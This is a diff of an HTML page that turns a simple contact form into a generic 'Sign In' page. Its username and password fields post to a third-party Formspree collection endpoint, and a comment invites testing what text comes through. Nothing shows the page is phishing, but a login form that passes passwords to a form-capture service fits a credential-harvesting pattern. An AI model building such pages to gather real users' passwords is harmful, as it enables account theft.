@@ -3,109 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Registry</title>
+    <title>Account Login</title>
     <style>
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             margin: 0; 
             padding: 0; 
-            background-color: #eef2f3; 
+            background-color: #f3f4f6; 
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
 
-        .form-container {
+        .login-container {
             background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             width: 90%;
-            max-width: 400px;
+            max-width: 360px;
             padding: 40px 30px;
         }
 
         h2 { 
-            color: #2c3e50; 
+            color: #111827; 
             margin-top: 0;
-            margin-bottom: 5px;
+            margin-bottom: 24px;
             text-align: center;
-        }
-
-        p {
-            color: #7f8c8d;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 30px;
+            font-size: 24px;
         }
 
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #34495e;
+            margin-bottom: 6px;
+            color: #374151;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 500;
         }
 
-        input[type="text"], input[type="email"] {
+        /* Styling for both text and password fields */
+        input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #cccccc;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
             border-radius: 6px;
             font-size: 14px;
             box-sizing: border-box;
             outline: none;
-            transition: border-color 0.3s;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         input:focus {
-            border-color: #3498db;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
         }
 
-        .submit-btn {
+        .login-btn {
             width: 100%;
-            padding: 14px;
-            background-color: #3498db;
+            padding: 12px;
+            background-color: #2563eb;
             color: white;
             border: none;
             border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.2s;
+            margin-top: 10px;
         }
 
-        .submit-btn:hover {
-            background-color: #2980b9;
+        .login-btn:hover {
+            background-color: #1d4ed8;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        .footer-text a {
+            color: #2563eb;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="form-container">
-        <h2>User Registry</h2>
-        <p>Please enter your details below to subscribe.</p>
+    <div class="login-container">
+        <h2>Sign In</h2>
         
-        <!-- ATTENTION: Replace the URL inside action="" with your real Formspree link! -->
+        <!-- You can keep your Formspree link here if you want to test what text goes through -->
         <form action="https://formspree.io/f/xbgdnvqn" method="POST">
             
             <div class="input-group">
-                <label for="username">Full Name</label>
-                <input type="text" id="username" name="name" placeholder="John Doe" required>
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
             </div>
 
             <div class="input-group">
-                <label for="useremail">Email Address</label>
-                <input type="email" id="useremail" name="email" placeholder="john@example.com" required>
+                <label for="password">Password</label>
+                <!-- Using type="password" hides the characters with dots as you type -->
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
             </div>
 
-            <button type="submit" class="submit-btn">Submit Details</button>
+            <button type="submit" class="login-btn">Log In</button>
             
         </form>
+
+        <div class="footer-text">
+            <p>Don't have an account? <a href="#">Create one</a></p>
+        </div>
     </div>
 
 </body>
